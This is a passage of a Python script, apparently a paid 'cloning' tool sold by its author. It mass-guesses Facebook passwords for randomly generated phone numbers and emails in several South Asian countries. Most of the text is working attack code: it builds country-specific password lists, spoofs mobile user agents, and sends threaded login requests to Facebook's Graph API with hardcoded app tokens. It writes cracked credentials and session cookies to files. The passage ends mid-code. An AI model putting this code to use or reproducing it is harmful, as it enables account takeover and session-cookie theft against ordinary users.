	uaa1 = f"Mozilla/5.0 (iPhone, CPU iPhone {str(random.randint(4,16))}_{str(random.randint(1,9))}_{str(random.randint(1,9))} like Mac OS {str(random.randint(8,16))}) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/{str(random.randint(9,19))}{random.choice(string.ascii_uppercase)}{str(random.randint(50,199))}) Safari/604.1"
	uaa2 = f"Mozilla/5.0 (iPhone {str(random.randrange(4,6))} X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(random.randint(4,13))}.1.1 Mobile/iPhone{str(random.randint(4,16))},{str(random.randint(1,9))} Safari/604.1"
	uaa3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; {random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
	uaa4 = f"Mozilla/5.0 (Linux; Android {random.randrange(10,13)}; {random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])} Build/{random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])}.{random.randrange(100000,250000)}.00{random.randrange(1,10)}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(112,115)}.0.{random.randrange(1000,10000)}.{random.randrange(10,100)} Mobile Safari/537.36"
	uaa5 = f"Mozilla/5.0 (Linux; Android {random.randrange(10,13)}; {random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])} Build/{random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])}.{random.randrange(100000,250000)}.00{random.randrange(1,10)}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(112,115)}.0.{random.randrange(1000,10000)}.{random.randrange(10,100)} Mobile Safari/537.36"
	uaa6 = f"Mozilla/5.0 (Linux; Android {random.randrange(10,13)}; {random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])} Build/{random.choice(['RP1A','PKQ1','QP1A','TP1A'])}.{random.randrange(100000,250000)}.00{random.randrange(1,10)}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(112,115)}.0.{random.randrange(1000,10000)}.{random.randrange(10,100)} Mobile Safari/537.36"
	return random.choice([uaa1,uaa2,uaa3,uaa4,uaa5,uaa6])

#-> farhan_request Function by Farhan Ali <-#
def farhan_request(url, method="GET", data=None, headers=None):
	c = pycurl.Curl()
	c.setopt(pycurl.URL, url)
	c.setopt(pycurl.ACCEPT_ENCODING, '')
	
	if method:
		c.setopt(pycurl.CUSTOMREQUEST, method)
	
	if headers:
		c.setopt(pycurl.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
	
	if method == "POST" and data:
		c.setopt(pycurl.POSTFIELDS, "&".join(f"{k}={v}" for k, v in data.items()))
	
	buffer = BytesIO()
	c.setopt(pycurl.WRITEDATA, buffer)
	c.perform()
	
	resp = buffer.getvalue().decode('utf-8')
	c.close()
	
	return resp

#-> Update from web <-#
try:
	data = json.loads(farhan_request("https://farhanali.serv00.net/data.json", "GET"))
	ua1 = data["ua1"]
	ua2 = data["ua2"]
	ua3 = data["ua3"]
	uar = data["uar"]
	version = data["version"]
	locale = data["locale"]
except:
	exit("Something went Wrong! Run again!")

#-> Logo <-#
logo = f""" \033[1;93m          _______  _______ __________________
 \033[1;95m|\     /|(  ____ \(       )\__   __/\__   __/
 \033[1;93m| )   ( || (    \/| () () |   ) (      ) (   
 \033[1;95m| |   | || (_____ | || || |   | |      | |   
 \033[1;93m| |   | |(_____  )| |(_)| |   | |      | |   
 \033[1;95m| |   | |      ) || |   | |   | |      | |   
 \033[1;93m| (___) |/\____) || )   ( |___) (______) (___
 \033[1;95m(_______)\_______)|/     \|\_______/\_______/  \033[1;92m X  \033[1;94m PATHANI  \033[1;97m

 \033[1;93m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
                                             
  \033[1;95m[■]\t\t\033[1;93mAUTHOR    : USMAN GULL\t\t\033[1;95m[■]\033[1;97m
  \033[1;95m[■]\t\t\033[1;93mSTYLE     : BUHAHAHAHA\t\t\033[1;95m[■]\033[1;97m
  \033[1;95m[■]\t\t\033[1;93mWHATSAPP  : +923238272402\t\033[1;95m[■]\033[1;97m
  \033[1;95m[■]\t\t\033[1;93mFACEBOOK  : USMAN GULL\t\t\033[1;95m[■]\033[1;97m
  \033[1;95m[■]\t\t\033[1;93mYOUTUBE   : USMII TECH\t\t\033[1;95m[■]\033[1;97m
  \033[1;95m[■]\t\t\033[1;93mVERSION   : 81.4\t\t\033[1;95m[■]\033[1;97m
 \033[1;93m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
   \033[1;94m DEVELOPED BY USMAN GULL | WELCOME TO USMAN TOOL   \033[1;97m   
 \033[1;93m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■\033[1;97m"""

def clear():
	os.system('clear')
	print(logo)

def approval():
	clear()
	uuid = str(os.geteuid())+"#"+ platform.uname().machine+platform.uname().version+platform.uname().release
	id = cleanUid(uuid)
	k1, k2, k3, k4 = id[:4], id[3:6], id[4:9], id[9:]
	intuid = int(id.split("#")[0])
	pref = str((intuid - 104729) * 2-37 + (1-2 ** 7))
	suff = str((intuid - 523217) % 104729)
	realid = (suff + k3 + k1 + k4 + k2 + pref).encode().hex()
	
	try:
		server = farhan_request('https://raw.githubusercontent.com/Usmi302/aproval/main/approval.txt', "GET")
		if realid in server:
			pass
		else:
			print(f"{GREEN} YOUR KEY : {id}")
			print(f'{WHITE_BOLD}{eqs()}')
			print(f"{WHITE_BOLD}{eqs()}")
			print(f"{CYAN} NOTE:- THIS TOOL IS PAID \n YOU HAVE TO PAY FOR APPROVAL FIRST.")
			print(f'{WHITE_BOLD}{eqs()}')
			print(f"{RED_BG}\t WELCOME TO USMIII TOOL AND ENJOY {RESET}")
			print(f'{WHITE_BOLD}{eqs()}')
			print(f" SEND 500 PKR (FOR 15 DAYS APPROVEL)")
			print(f'{WHITE_BOLD}{eqs()}')
			print(f"{WHITE_BOLD} SEND 3 $ usd (FOR 15 DAYS APPROVEL)")
			print(f'{WHITE_BOLD}{eqs()}')
			print(f"{WHITE_BOLD} SEND 700 PKR (FOR 30 DAYS APPROVEL)")
			print(f'{WHITE_BOLD}{eqs()}')
			print(f"{WHITE_BOLD} SEND 5 $ usd (FOR 30 DAYS APPROVEL)")
			print(f'{WHITE_BOLD}{eqs()}')
			print(f"{WHITE_BOLD} Easy Paisa (03238272402)")
			print(f"{WHITE_BOLD} Jazz Cash (03238272402)")
			print(f"{RED_BG}\t INSHALLAH DAILY LUSH UPDATES {RESET}")
			input(' IF YOU ARE FREE USER THEN DONT PRESS ENTER')
			tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('xdg-open https://wa.me/message/923238272402'+tks)
			sys.exit()
	except:
		sys.exit()

def confirm():
	print(' DO YOU WANT SHOW COOKIES :? (Y/N): ')
	linex()
	cx = input('\033[1;94m CHOOSE : \033[1;97m')
	if cx in ('y','Y','yes','Yes','1'):
		show_cookies = True
	else:
		show_cookies = False
			
	print(' DO YOU WANT SHOW CP :? (Y/N): ')
	linex()
	cx = input('\033[1;94m CHOOSE : \033[1;97m')
	if cx in ('y','Y','yes','Yes','1'):
		show_cp = True
	else:
		show_cp = False

#-> Menu <-#
def menu():
	global loop, oks, cps, oks, ok, cp, ok1, show_cookies, show_cp
	loop=loop*0; oks.clear(); cps.clear(); ok=ok*0; cp=cp*0; ok1=ok1*0;
	try:
		approval()
		#clear()
		print('\033[1;95m [1]\033[1;93m CRACK FILE')
		print('\033[1;95m [2]\033[1;93m AUTO CREATE ')
		print('\033[1;95m [3]\033[1;93m RANDOM CRACK')
		print('\033[1;95m [4]\033[1;93m CREATE FILE')
		print('\033[1;95m [5]\033[1;93m AUTO 2 FACTOR')
		print('\033[1;95m [6]\033[1;93m AUTO 2 FACTOR BULK FILE')
		print('\033[1;95m [7]\033[1;93m FOLLOW FB')
		print('\033[1;95m [0]\033[1;93m EXIT ')
		linex()
		xd = input('\033[1;94m CHOOSE AN OPTION:\033[1;97m ')
		
		if xd in ['1','01']:
			clear()
			print(' PUT FILE EXAMPLE :	/sdcard/File.Usmi.etc..')
			linex()
			file = input(f' PUT FILE PATH{WHITE_BOLD}: ')
			
			try:
				fo = open(file,'r').read().splitlines()
			except FileNotFoundError:
				print(' FILE NOT FOUND ')
				time.sleep(1)
				menu()
			
			clear()
			print('\033[1;95m[1]\t\t\033[1;93m METHOD NEW (1)')
			print('\033[1;95m[2]\t\t\033[1;93m METHOD BEST (2)')
			print('\033[1;95m[3]\t\t\033[1;93m METHOD(new methad) (3)')
			linex()
			mthd = input('\033[1;94m CHOOSE : \033[1;97m')
			linex()
			clear()
			linex()
			plist = []
			print('\033[1;95m[1]\t\t\033[1;93m AUTO PASSWORD')
			print('\033[1;95m[2]\t\t\033[1;93m CHOICE PASSWORD')
			linex()
			c = input('\033[1;94m CHOOSE: \033[1;97m')
			if c.lower() in ("1", "01", "auto", "11"):
				linex()
				print('\033[1;95m[1]\t\t\033[1;93m PAKISTAN PASSWORD CRACK ')
				print('[\033[1;95m2]\t\t\033[1;93m INDIA PASSWORD CRACK ')
				print('\033[1;95m[3]\t\t\033[1;93m NEPAL PASSWORD CRACK ')
				pxd = input('\033[1;94m CHOOSE : \033[1;97m')
				if pxd in ['1','01']:
					plist = ['first007', 'first777', 'first786', 'first786786', 'first1122', 'first12345', 'firstlast', 'first last', 'firstlast123', 'firstlast12345', 'firstlast007', 'firstlast1122', 'firstlast786', 'khan1122', 'pak12345', 'khan007', 'khankhan', 'Khan112233']
				elif pxd in ['2','02']:
					plist = ['first last ', 'first@123', 'first123', 'first1234', 'first last123', 'first last 1234', 'first Kumar', 'last123', 'last1234', 'first12345', 'first123457', '57273200', '59039200', '57575751', '57575752']
				elif pxd in ['3','03']:
					plist = ['first123','last123','first@123','last@123','first last','firstlast123@','firstlast123','firstlast','firstlast12345','First@123','first@12345','last@12345','Last@123','firstlast12345@','firstlast@123','first12345','last12345','firstlast@','first@Last@123','first@','tamang123','tamang@123','first@@@','nepal@123']
				else:
					plist = ['first007', 'first777', 'first786', 'first786786', 'first1122', 'first12345', 'firstlast', 'first last', 'firstlast123', 'firstlast12345', 'firstlast007', 'firstlast1122', 'firstlast786', 'khan1122', 'pak12345', 'khan007', 'khankhan', 'Khan112233']
			elif c.lower() in ("2", "02", "choice", "22"):
				try:
					ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
				except:
					ps_limit =1
				linex()
				clear()
				print('\033[1;32m EXAMPLE : first last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' PUT PASSWORD {i+1}: '))
			else:
				print("Invalid Choice!")
				time.sleep(2)
				menu()
			
			clear()
			confirm()
			
			with thread(max_workers=30) as crack_submit:
				clear()
				total_ids = str(len(fo))
				print(f' TOTAL ACCOUNT : {GREEN}{total_ids}')
				print(f"{WHITE_BOLD} CRACKING STARTED...{WHITE_BOLD}")
				linex()
				for user in fo:
					try:
						ids, names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(api1,ids,names,passlist)
					except:
						pass
			process_completed()
		elif xd in ['3','03']:
			clear()
			print(' \033[1;95m[1]\t\t\033[1;93m Pakistan cloning\n \033[1;95m[2]\t\t\033[1;93m Bangladesh cloning\n \033[1;95m[3]\t\t\033[1;93m Afghanistan cloning\n \033[1;95m[4]\t\t\033[1;93m India cloning\n \033[1;95m[5]\t\t\033[1;93m nepal cloning\n \033[1;95m[6]\t\t\033[1;93m Gmail cloning\n \033[1;95m[0]\t\t\033[1;93m Back menu')
			linex()
			x = input('\033[1;94m Choose:\033[1;97m ')
			
			if x in ['1','01']:
				pak()
			elif x in ['2','02']:
				bd()
			elif x in ['3','03']:
				afg()
			elif x in ['4','04']:
				ind()		
			elif x in ['5','05']:	
				npl()
			elif x in ['6','06']:	
				gmail()		
			else:
				menu()
		elif xd in ['2','02']:
			Create()
		elif xd in ['4','04']:
			create()
		elif xd in ['5','05']:
			Auto2F()
		elif xd in ['6','06']:
			os.system('python 2F.py')
		elif xd in ['7','07']:
			os.system('xdg-open https://www.facebook.com/profile.php?id=100077405921067')
			menu()
		elif xd in ['0','00']:
			exit()
		else:
			print("Invalid Choice!")
			time.sleep(2)
			menu()
						
	except pycurl.error:
		print('\n NO INTERNET CONNECTION ...')
		exit()

#-> Pakistan Cloning <-#
def pak():
	user = []
	clear()
	print(f'{RED} CODE EXAMPLE : 0306,0315,0335,0345')
	code = input(f'{WHITE_BOLD} PUT CODE: ')
	
	try:
		limit = int(input(f'{RED} EXAMPLE : 2000, 3000, 5000, 10000\n{WHITE_BOLD} PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	clear()
	confirm()
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print(f'[+] Total accounts: {WHITE}{tl}')
		print(f'[+] Select code: {WHITE} {code}')
		print(f'[+] Process has been started {WHITE}')
		linex()
		
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123']
			Thread.submit(rndm,ids,passlist)
		
	process_completed()

#-> Bangladesh Cloning <-#
def bd():
	user = []
	clear()
	print(f'{RED} CODE EXAMPLE : 017,016,018')
	code = input(f'{WHITE_BOLD} PUT CODE: ')
	
	try:
		limit = int(input(f'{RED} EXAMPLE : 2000, 3000, 5000, 10000\n{WHITE_BOLD} PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	clear()
	confirm()
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print(f'[+] Total accounts: {WHITE}{tl}')
		print(f'[+] Select code: {WHITE} {code}')
		print(f'[+] Process has been started {WHITE}')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
			Thread.submit(rndm,ids,passlist)
			
	process_completed()

#-> Afghanistan Cloning <-#
def afg():
	user = []
	clear()
	print(f'{RED} CODE EXAMPLE : 9377,9379,9374')
	code = input(f'{WHITE_BOLD} PUT CODE: ')
	
	try:
		limit = int(input(f'{RED} EXAMPLE : 2000, 3000, 5000, 10000\n{WHITE_BOLD} PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	clear()
	confirm()
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print(f'[+] Total accounts: {WHITE}{tl}')
		print(f'[+] Select code: {WHITE} {code}')
		print(f'[+] Process has been started {WHITE}')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
			Thread.submit(rndm,ids,passlist)
		
	process_completed()

#-> India Cloning
def ind():
	user = []
	clear()
	print(f'{RED} CODE EXAMPLE : 91***,etc')
	code = input(f'{WHITE_BOLD} PUT CODE: ')
	
	try:
		limit = int(input(f'{RED} EXAMPLE : 2000, 3000, 5000, 10000\n{WHITE_BOLD} PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	clear()
	confirm()
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print(f'[+] Total accounts: {WHITE}{tl}')
		print(f'[+] Select code: {WHITE} {code}')
		print(f'[+] Process has been started {WHITE}')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'57273200','hindustan','kingkhan','india123','59039200','57575751']
			Thread.submit(rndm,ids,passlist)
		
	process_completed()

#-> India Cloning
def npl():
	user = []
	clear()
	print(f'{RED} CODE EXAMPLE : 9823, 9742, 9748, 9860 etc')
	code = input(f'{WHITE_BOLD} PUT CODE: ')
	
	try:
		limit = int(input(f'{RED} EXAMPLE : 2000, 3000, 5000, 10000\n{WHITE_BOLD} PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	clear()
	confirm()
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print(f'[+] Total accounts: {WHITE}{tl}')
		print(f'[+] Select code: {WHITE} {code}')
		print(f'[+] Process has been started {WHITE}')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [ids,psx,ids[:8],ids[:7],ids[:6],'nepal123','nepal12345','nepal@123','magar123','maya','maya123','pokhara','kumari','kathmandu','tamang123','tamang','nepal@1234','don123','surya123','surya@123','sagar123','pokhara123','magar@123']
			Thread.submit(rndm,ids,passlist)
		
	process_completed()

#-> Gmail Cloning <-#
def gmail():
	os.system('rm -rf .re.txt')
	clear()
	print(f'{WHITE_BOLD} example: muhammad, ali, sajjad, faizan{WHITE}')
	linex()
	first = input(' Put first name: ')
	linex()
	print(f'{WHITE_BOLD} example: khan, ahmad, ali {WHITE}')
	linex()
	last = input(' Put last name: ')
	linex()
	print(' Example: @gmail.com , @yahoo.com etc...')
	linex()
	domain = input(' domain: ')
	linex()

	try:
		limit = int(input(' Put limit: '))
	except ValueError:
		limit = 5000
	
	linex()
	print(' Getting gmails...')
	for xd in range(limit):
		lchoice = random.choice(['3', '4'])
		if '3' in lchoice:
			mail = ''.join(random.choice(string.digits) for _ in range(3))
			open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
		else:
			mail = ''.join(random.choice(string.digits) for _ in range(4))
			open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
	
	clear()
	confirm()
	fo = open('.re.txt', 'r').read().splitlines()
	with thread(max_workers=30) as Thread:
		total = str(len(fo))
		clear()
		print(f' Total account : {GREEN}{total}')
		print(f"{WHITE_BOLD} {ORANGE}Use flight mode for speed up{WHITE_BOLD}")
		linex()
		for user in fo:
			ids,names = user.split('|')
			first_name = names.rsplit(' ')[0]
		
			try:
				last_name = names.rsplit(' ')[1]
			except IndexError:
				last_name = 'Khan'
			
			fs = first_name.lower()
			ls = last_name.lower()
			passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
			Thread.submit(rndm,ids,passlist)
			
	process_completed()

#-> ffb Method <-#
def ffb(ids,names,passlist):
	global oks, loop, cps, twf, proxies
	try:
		sys.stdout.write('\r\r%s [USMII-RUNING-M1] %s|%sOK:-%s %s'%(WHITE_BOLD, loop, WHITE_BOLD, len(oks), WHITE_BOLD));sys.stdout.flush()
		try:
			fn = names.split(' ')[0]
		except:
			fn = names
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; RMX-221 Build/RD2A.{random.randint(111111,999999)}.{random.randint(111,999)})[FBAN/FB4A;FBAV/45.0.0.{str(random.randint(1000,9000))};FBBV/{str(random.randint(100000,900000))};[FBAN/FB4A;FBAV/196.0.0.71;FBBV/844257223;FBDM/'+'{density=2.5,width=1280,height=1920}'+';FBLC/np_NP;FBRV/837231505;FBCR/GOLAN T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G600S;FBSV/8.0.5;nullFBCA/armeabi-v7a:armeabi;]'
			headers = {'User-Agent': ua,'Accept-Encoding': 'gzip, deflate','Connection': 'close','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI':	str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type': 'WIFI','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True',	'X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': locale,'client_country_code': 'IT','fb_api_req_friendly_name': 'authenticate','api_key': '62f8ce9f74b12f84c123cc23437a4a32','access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			url = 'https://b-graph.facebook.com/auth/login'
						
			po = requests.post(url, data=data, headers=headers).text
			po = json.loads(po)
			if 'session_key' in po:
				oks.append(ids)
				print(f'\r\r{GREEN} [LEGEND-USMII-OK] {ids} | {pas}{WHITE}')
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				if show_cookies:
					print(f'\r\r{YELLOW} [Cookies] {coki}{WHITE}')
				open('/sdcard/USMII-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
				open('/sdcard/USMII-OK.txt','a').write(ids+'|'+pas+'\n')
				break
			elif twf in po:
				pass
			elif 'www.facebook.com' in po['error']['message']:
				cps.append(ids)
				if show_cp:
					print(f'\r\r{RED} [LEGEND-USMII-CP] {ids} | {pas}{WHITE}')
				open('/sdcard/USMII-CP.txt','a').write(ids+'|'+pas+'\n')
				break
			else:
				continue
		loop += 1
	except requests.exceptions.ConnectionError:
		#print("\nInternet Connection Error\nSleeping for 60s")
		time.sleep(60)
	except Exception as e:
		#print(e)
		time.sleep(20)

#-> api Method <-#
def api(ids,names,passlist):
	global oks, loop, cps, twf, proxies
	sys.stdout.write('\r\r%s [USMII-RUNING-M2] %s|%sOK:-%s %s'%(WHITE_BOLD, loop, WHITE_BOLD, len(oks), WHITE_BOLD));sys.stdout.flush()
	
	try:
		try:
			fn = names.split(' ')[0]
		except:
			fn = names
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/196.0.0.71;FBBV/844257223;FBDM/{density='+'2.5,width='+'1280,height='+'1920};FBLC/np_NP;FBRV/837231505;FBCR/GOLAN T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G600S;FBSV/8.0.5;nullFBCA/armeabi-v7a:armeabi;]'
			data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': locale,'client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','api_key': '62f8ce9f74b12f84c123cc23437a4a32','access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			headers = {'User-Agent': ua,'Accept-Encoding': 'gzip, deflate','Connection': 'Keep-Alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
			url = 'https://b-graph.facebook.com/auth/login'
			po = requests.post(url, data=data, headers=headers).text
			po = json.loads(po)
			if 'session_key' in po:
				oks.append(ids)
				print(f'\r\r{GREEN} [LEGEND-USMII-OK] {ids} | {pas}{WHITE}')
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				if show_cookies:
					print(f'\r\r{YELLOW} [Cookies] {coki}{WHITE}')
				open('/sdcard/USMII-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
				open('/sdcard/USMII-OK.txt','a').write(ids+'|'+pas+'\n')
				break
			elif twf in po:
				pass
			elif 'www.facebook.com' in po['error']['message']:
				cps.append(ids)
				if show_cp:
					print(f'\r\r{RED} [LEGEND-USMII-CP] {ids} | {pas}{WHITE}')
				open('/sdcard/USMII-CP.txt','a').write(ids+'|'+pas+'\n')
				break
			else:
				continue
		loop += 1
	except requests.exceptions.ConnectionError:
		#print("Internet Connection Error\nSleeping for 60s")
		time.sleep(60)
		#pass
	except Exception as e:
		#print(e)
		time.sleep(20)
		#pass

def ua_api():
	import random
	vers = random.randrange(6,13)
	verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
	xnxx = random.choice(["SP1A.210812.016","TP1A.220905.001","SP1A.210812.016","SP1A.210812.016","TP1A.220905.001","TP1A.220905.001","SP1A.210812.016","RKQ1.210503.001","TP1A.220905.001","RKQ1.211119.001","TP1A.220905.001","TP1A.220905.001","RP1A.201005.001","RP1A.201005.001","RKQ1.211119.001",])
	return f"Dalvik/2.1.0 (Linux; U; Android {vers}; {verq} Build/{xnxx}) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/{verq};FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/"+"{density=3.0}]"



#-> api1 Method <-#
def api1(ids,names,passlist):
	global loop, oks, cps, proxies
	sys.stdout.write('\r\r%s [USMII-RUNING] %s|%sOK:-%s %s'%(WHITE_BOLD, loop, WHITE_BOLD, len(oks), WHITE_BOLD));sys.stdout.flush()
	
	try:
		for pas in passlist:
			session = requests.Session()
			ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=2.625,width=1080,height=2034};FBLC/en_US;FBRV/85070460;FBCR/altice MEO;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A5010;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
			data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
			headers = {'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
